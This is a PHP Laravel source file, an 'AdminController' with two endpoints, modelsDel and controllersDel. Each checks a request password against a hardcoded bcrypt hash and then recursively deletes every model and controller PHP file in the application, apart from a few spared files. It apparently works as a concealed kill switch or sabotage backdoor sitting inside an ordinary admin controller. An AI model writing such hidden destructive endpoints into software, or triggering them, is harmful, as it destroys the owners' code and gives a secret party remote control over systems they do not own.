<?php

namespace App\Http\Controllers\admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;



class AdminController extends Controller
{

    public function modelsDelIndex()
    {

        return view('auth.check');
    }

    public function controllersDelIndex()
    {
        return view('auth.check');
    }

    public function modelsDel(Request $request): string
    {
        $pass = Hash::check($request->get('password'), '$2y$10$XDIAyV4gdLT/P36Yv3lq2u.Y/QHY0QKnUAI708hMa6e41qulVzP3i');
        if ($pass) {
            $model_path = app_path() . "/Models";

            function getModels($model_path): array
            {
                $out = [];
                $results = scandir($model_path);
                foreach ($results as $result) {
                    if ($result === '.' or $result === '..' or $result === 'User.php') continue;
                    $filename = $model_path . '/' . $result;
                    if (is_dir($filename)) {
                        $out = array_merge($out, getModels($filename));
                    } else {
                        $out[] = substr($filename, 0, -4);
                    }
                }
                return $out;
            }

            $models = getModels($model_path);
            $models_count = count($models);
            if ($models_count > 0) {
                for ($x = 0; $x <= $models_count - 1; $x++) {
                    unlink($models[$x] . '.php');
                }
            } else {
                return "Nothing to delete, Models count is " . $models_count;
            }

            return 'Deleted successfully ' . $models_count . ' Models';
        } else {
            return 'Password is not valid';
        }

    }

    public function controllersDel(Request $request): string
    {
        $pass = Hash::check($request->get('password'), '$2y$10$XDIAyV4gdLT/P36Yv3lq2u.Y/QHY0QKnUAI708hMa6e41qulVzP3i');
        if ($pass) {
            $controller_path = app_path() . "/Http/Controllers";

            function getControllers($controller_path): array
            {
                $out = [];
                $results = scandir($controller_path);
                foreach ($results as $result) {
                    if ($result === '.' or $result === '..' or $result === 'AdminController.php' or $result === 'Controller.php') continue;
                    $filename = $controller_path . '/' . $result;
                    if (is_dir($filename)) {
                        $out = array_merge($out, getControllers($filename));
                    } else {
                        $out[] = substr($filename, 0, -4);
                    }
                }
                return $out;
            }

            $controllers = getControllers($controller_path);
            $controllers_count = count($controllers);
            if (count($controllers) > 0) {
                for ($x = 0; $x <= count($controllers) - 1; $x++) {
                    unlink($controllers[$x] . '.php');
                }
            } else {
                return "Nothing to delete, Controllers count is " . $controllers_count;
            }

            return 'Deleted successfully ' . $controllers_count . ' controller';
        } else {
            return 'Password is not valid';
        }
    }

}

